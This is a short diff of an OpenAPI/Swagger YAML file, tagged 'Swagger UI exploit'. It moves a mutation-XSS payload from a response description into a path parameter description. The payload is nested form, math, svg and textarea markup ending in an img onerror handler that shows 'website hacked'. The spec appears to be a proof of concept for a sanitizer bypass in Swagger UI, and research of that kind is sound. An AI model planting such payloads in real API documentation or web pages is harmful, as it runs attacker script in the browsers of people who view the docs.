@@ -44,7 +44,8 @@ paths:
       summary: afine
     get:
       parameters:
-      - description: this is example text
+      - description: |
+          <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert("website hacked") src=1>"></form>
         format: int64
         in: path
         name: id
@@ -52,8 +53,7 @@ paths:
         type: integer
       responses:
         '200':
-          description: |
-          <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert("website hacked") src=1>"></form>
+          description: No response was specified
       tags:
       - Swagger UI exploit
       operationId: some_operation
